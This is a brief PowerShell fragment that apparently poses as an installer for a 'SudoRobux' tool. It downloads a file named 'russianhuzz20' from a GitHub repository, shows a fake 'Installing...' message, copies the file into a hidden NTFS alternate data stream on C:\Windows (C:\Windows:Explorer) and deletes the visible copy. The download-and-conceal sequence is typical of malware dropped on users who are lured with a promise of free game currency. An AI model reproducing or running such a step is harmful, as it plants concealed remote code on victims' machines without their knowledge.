...
curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/russianhuzz20 -o russianhuzz20
Write-Host "Installing..." -ForegroundColor DarkCyan
cmd.exe /c "type russianhuzz20 > C:\Windows:Explorer"
rm .\russianhuzz20
